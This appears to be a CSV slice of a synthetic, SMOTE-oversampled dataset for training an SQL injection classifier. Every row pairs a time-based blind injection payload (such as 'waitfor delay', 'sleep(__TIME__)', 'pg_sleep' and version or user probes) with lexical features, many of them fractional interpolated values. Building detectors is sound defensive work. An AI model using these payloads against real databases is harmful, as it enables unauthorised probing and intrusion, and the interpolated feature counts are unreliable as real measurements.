id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001953,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.3212494041512652,107.0178201412584,31.52256418078771,4.043951115082702,47.125897005667596,5.8919231355907815,35.738717909606144,18.261282090393856,0.4352852701729145,0.05656030021598904,0.3355670660518127,0.17258736355928372,2.7387179096061454,0.0,2.0,0.0,0.0,0.0,0.6306410451969273,6.0,0.0,0.0,1.6306410451969273,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.6306410451969273,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6306410451969272,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6306410451969273
SMOTE_001954,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.4780841766337627,36.2104663681573,16.0,3.1407951464577706,11.552616592039323,0.7236917039803379,15.10523318407865,8.828924888058985,0.31965954767479465,0.02128505011706876,0.4164085427902464,0.24264685941789016,0.0,0.0,0.5526165920393242,0.0,0.0,0.0,0.0,3.2763082960196623,0.0,4.276308296019662,-5.551115123125783e-17,0.5526165920393242,0.0,0.0,0.2763082960196621,0.7236917039803379,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7236917039803379,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7236917039803379
SMOTE_001955,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.548458805984638,113.67862033133522,28.782800829850416,4.024260155548397,58.393609958205005,4.0,34.71940871342938,16.56560165970083,0.5143389849717823,0.036168729732852234,0.30198087450644573,0.14751141078891963,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.565601659700834,0.0,0.10859958507479117,1.0,3.8914004149252084,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.8914004149252086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.891400414925209
SMOTE_001956,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.6498715328249028,29.258124117216102,14.75487447032966,3.3673002558728125,11.503249646886442,0.2516248234432199,8.503249646886438,9.0,0.3931294640946355,0.0076249946497945476,0.2900714255141683,0.30917411574140163,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.25162482344322,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2516248234432201
SMOTE_001957,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.4435250614574522,36.411853740264846,16.0,3.0965250705567997,11.0,0.0,15.929482992211874,9.482370748052968,0.3072233500062659,0.0,0.43133197999248096,0.26144467000125315,0.0,1.7411853740264842,0.0,0.0,0.0,0.7411853740264842,0.0,2.741185374026484,0.0,4.0,-5.551115123125783e-17,0.7411853740264842,0.0,1.0,0.0,0.25881462597351584,0.0,0.7411853740264842,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001958,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.6055586562728625,26.477135862354363,17.0,3.927279478604889,12.477135862354364,4.5228641376456356,3.0,6.477135862354365,0.4710539915569247,0.17123759012395257,0.11334557323780187,0.24436284508132092,2.4771358623543644,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001959,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.8903171523549379,33.23881956239552,22.223881956239552,4.253173279850833,16.0,2.0,3.791055649916416,11.447763912479104,0.48794562313270784,0.06099320289158848,0.10467748703589128,0.34638368693981236,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.4477639124791035,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.22388195623955176,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001960,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5732624410034697,26.548311189493898,17.0,3.9238807015348103,12.548311189493898,4.451688810506102,3.0,6.548311189493897,0.4724734425255193,0.16809452012206436,0.11304140517310299,0.2463906321793133,2.5483111894938975,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001961,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7445990570561486,25.79269330337001,14.329274057427785,3.247067086199107,10.19512886891334,0.26829037702888625,8.865854811485557,6.463419245942228,0.3900182163036833,0.014905020946049237,0.34823835427938254,0.24683840847088487,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,3.4634192459422275,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.865854811485557,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8658548114855569,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8658548114855569
SMOTE_001962,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.6751942854352847,29.710791901546315,14.513237570463893,3.3226441470829027,11.342158380309263,0.0,9.026475140927786,9.342158380309263,0.3841745523793702,0.0,0.29986369241880406,0.3159617552018257,0.0,0.17107919015463138,2.0,0.0,0.0,0.0,0.0,2.1710791901546314,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.17107919015463136,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17107919015463136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17107919015463136
SMOTE_001963,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.2340303955861005,28.013388268228095,18.216065921873714,3.9981149566156104,13.608032960936857,3.594644692708762,2.797322346354381,8.013388268228095,0.4852347713638077,0.1307891824423891,0.10125872517000464,0.2827173210237985,2.7973223463543815,0.20267765364561888,2.0,0.0,0.0,0.0,0.20267765364561874,0.0,0.0,0.8107106145824754,-5.551115123125783e-17,2.0,1.0,0.20267765364561885,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.20267765364561874,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001964,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.452358435560794,40.53267593991996,16.0,2.886083512851476,11.0,0.0,19.943896616599968,9.588779323319994,0.27287276220042767,0.0,0.49017516268734096,0.23695207511223138,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.5887793233199936,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001965,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.4876826845435034,30.643752339331034,15.728750467866206,3.2231692531956906,11.0,0.0,11.915001871464828,7.728750467866208,0.3610170419761095,0.0,0.3864713882819109,0.2525115697419796,0.728750467866207,0.0,0.0,0.0,0.0,0.7287504678662072,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.7287504678662071,0.7287504678662071,0.0,0.0,0.2712495321337929,0.0,0.7287504678662072,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001966,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.7927190820975902,36.75057796436854,17.0,3.372891696628626,13.0,0.24988440712629156,13.000462371494834,10.500231185747417,0.35505780419713634,0.007572254761402782,0.35208092393592033,0.28528901710554055,0.0,0.7501155928737082,2.0,0.0,0.0,0.0,0.0,2.7501155928737084,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.7501155928737081,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001967,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.036611357459404574,119.0,29.21921080513159,4.003077151290466,61.0,4.0,37.0,17.0,0.5126050420168067,0.03361344537815126,0.31092436974789917,0.14285714285714285,4.0,0.0,2.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001968,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.11661375219207186,18.349216722135264,10.110278964884818,2.730656776219189,5.110278964884818,1.9632403450383935,8.16541844732723,3.11027896488482,0.27813654317905473,0.10906890805768851,0.44472041783004207,0.16807413093321466,0.018379827480803357,0.0,0.0,0.0,0.0,0.018379827480803246,0.0,2.0183798274808034,0.0,0.07351930992321298,-5.551115123125783e-17,0.018379827480803357,0.018379827480803246,0.0,0.0,0.0,0.0,0.018379827480803246,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.018379827480803246,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0183798274808034
SMOTE_001969,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.4742622707525237,33.25839155804742,16.0,3.1965812080791456,11.0,0.8516783116094846,13.406713246437938,8.0,0.33180293393659066,0.02504936210616131,0.40183647927609123,0.24131122468115682,0.0,0.14832168839051554,0.0,0.0,0.0,0.0,0.0,2.8516783116094846,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.14832168839051552,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001970,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.27868684763409574,35.110632795027705,23.055316397513852,4.2844267487411605,16.0,2.0,5.055316397513851,12.055316397513852,0.4557759654668392,0.0569719956833549,0.1439250269790319,0.343327011870774,2.0,0.05531639751385187,2.0,0.0,0.0,0.0,0.05531639751385184,1.0000000000000002,0.0,4.0,0.944683602486148,2.0,1.0,0.055316397513851895,1.0,0.0,0.0,0.0,1.0,0.05531639751385184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001971,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.5718235680227308,101.72867175323233,32.63606910458267,4.05737166266597,41.001619924795335,6.7270518284369984,35.18196544770866,18.818034552291333,0.4011549406809641,0.06668945214882972,0.34644479272333906,0.18571081444686716,2.181965447708667,0.0,2.0,0.0,0.0,0.0,0.9090172761456666,6.0,0.0,0.0,1.9090172761456665,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9090172761456666,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9090172761456664,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9090172761456667
SMOTE_001972,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,2.196499363762165,41.18208000484298,16.0,2.8956138064731385,11.0,0.0,20.25272889265565,9.929351112187328,0.2702685781120607,0.0,0.4883993002032482,0.24133212168469118,0.5353244439063357,0.9293511121873286,0.0,0.0,0.0,1.0,0.0,3.464675556093664,0.0,4.0,-5.551115123125783e-17,1.0,0.5353244439063357,0.46467555609366423,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001973,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.5596149370421748,39.90886109624746,16.0,2.9295570658143166,11.0,0.0,19.262447519303578,9.64641357694388,0.278497372468436,0.0,0.4795886719024828,0.24191395562908133,0.6767932115280602,0.6464135769438799,0.0,0.0,0.0,1.0,0.0,3.32320678847194,0.0,4.0,-5.551115123125783e-17,1.0,0.6767932115280602,0.32320678847193984,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001974,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.33241751615425025,33.69669617893426,16.0,3.125176295291794,11.0,0.0,14.388205964582578,8.308490214351684,0.3301862950811941,0.0,0.4225040265555938,0.24730967836321205,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.308490214351684,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001975,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.1976696567638856,43.754052342859296,16.584684114286432,3.0734714337106723,13.0,0.0,19.16936822857286,11.58468411428643,0.29745889922901014,0.0,0.4378521287981973,0.2646889719727925,0.0,0.5846841142864312,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.5846841142864311,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001976,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.4678145582560015,34.20787487508831,16.0,3.1059975029809026,11.0,0.0,14.766299900070644,8.44157497501766,0.32323764896455126,0.0,0.4297459657315141,0.24701638530393474,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.441574975017661,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001977,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.273195616662614,38.60079924279795,16.0,3.012246228343028,11.0,0.0,17.714856601998534,9.885942640799414,0.28556987846892834,0.0,0.4583854335797915,0.25604468795128016,0.05702867960029323,1.8859426407994138,0.0,0.0,0.0,1.0,0.0,2.9429713203997068,0.0,4.0,-5.551115123125783e-17,1.0,0.057028679600293175,0.9429713203997069,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001978,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.3740915510684095,42.23573110280803,16.0,2.8792992015037076,11.0,0.0,21.042360152206307,10.19337095060172,0.2672601615958639,0.0,0.4906868346019684,0.24205300380216768,0.26887634979942665,1.462247300401147,0.0,0.0,0.0,1.0,0.0,3.462247300401147,0.0,4.0,-5.551115123125783e-17,1.0,0.2688763497994266,0.7311236502005735,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001979,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.9013354034727901,36.64218887331725,23.821094436658626,4.300117909725432,16.0,2.0,5.821094436658626,12.821094436658626,0.43685326488565557,0.054606658110706946,0.15870838680808158,0.34983169019555593,2.0,0.8210944366586268,2.0,0.0,0.0,0.0,0.8210944366586269,1.0000000000000002,0.0,4.0,0.1789055633413732,2.0,1.0,0.8210944366586268,1.0,0.0,0.0,0.0,1.0,0.8210944366586269,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001980,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.5725080103863565,29.56113615972415,18.92085211979311,4.024279831146602,13.960426059896555,3.3597159600689634,3.6402840399310374,8.600710099827593,0.4736896651225323,0.11901353045816446,0.12127434984017518,0.286022454579128,2.6798579800344817,0.0,2.0,0.0,0.0,0.0,0.0,0.3201420199655187,0.0,1.2805680798620735,0.3201420199655183,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.3201420199655184,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001981,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4577000101858688,104.41742953266566,32.30251112642121,4.053511557245445,44.11491840624444,6.302511126421212,35.46499258238586,18.535007417614143,0.41850521755046083,0.06154026100113123,0.3409150608903603,0.17903946055804762,2.464992582385859,0.0,2.0,0.0,0.0,0.0,0.7675037088070706,6.0,0.0,0.0,1.7675037088070704,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.7675037088070706,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7675037088070705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7675037088070704
SMOTE_001982,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.8671229894329011,79.45379526409343,28.41815181056374,4.165211085808969,40.435973537328586,3.2090759052818685,21.181518105637373,14.627227715845606,0.5083667445904765,0.04141576564025924,0.259872150748921,0.1903453390203433,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.8363036211274744,0.0,0.7909240947181311,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001983,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.2375733581106203,106.99253903033181,28.50989955225844,4.057251939593646,55.118794627101295,4.0,31.853945298713633,16.01979910451688,0.5165176086164242,0.03937933299864019,0.29074376307618793,0.1533592953087477,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.019799104516883,0.0,0.24505022387077924,1.0,3.7549497761292203,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7549497761292205,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7549497761292208
SMOTE_001984,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9472379503885805,33.437303056337676,23.287460611267534,4.35452813925575,16.0,2.0,3.1498424450701403,12.287460611267536,0.48057698572516655,0.06007212321564581,0.09114894605537938,0.3682019450038083,2.0,1.0,2.0,0.0,0.0,0.0,1.0,0.2874606112675355,0.0,4.0,-5.551115123125783e-17,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.2874606112675353,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
